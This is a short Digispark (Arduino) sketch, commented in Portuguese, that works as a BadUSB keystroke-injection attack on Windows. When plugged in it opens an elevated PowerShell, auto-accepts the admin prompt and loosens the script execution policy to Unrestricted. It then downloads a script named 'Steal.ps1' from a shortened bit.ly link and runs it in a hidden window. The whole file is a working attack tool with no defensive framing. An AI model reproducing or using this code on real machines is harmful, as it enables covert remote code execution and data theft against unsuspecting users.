#include "DigiKeyboard.h"
int porta = 1; //Inicia uma variavel do tipo inteiro que receber o valor da porta, no caso, porta 1
 
void setup() {
   pinMode(porta, OUTPUT); //Declara a porta 1 como saida
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(700);
  DigiKeyboard.println("powershell Start-Process powershell -Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4500);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(4500);
  DigiKeyboard.print("Cd C:/Users/Public/Documents");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("a");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Set-ExecutionPolicy Unrestricted");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("a");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Invoke-WebRequest -Uri 'https://bit.ly/3CgYYZy' -OutFile 'Steal.ps1'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -windowstyle hidden -noexit ./Steal.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(700);
  digitalWrite(porta, HIGH);

  
  for (;;) {
    /*Stops the digispark from running the scipt again*/
  }
}
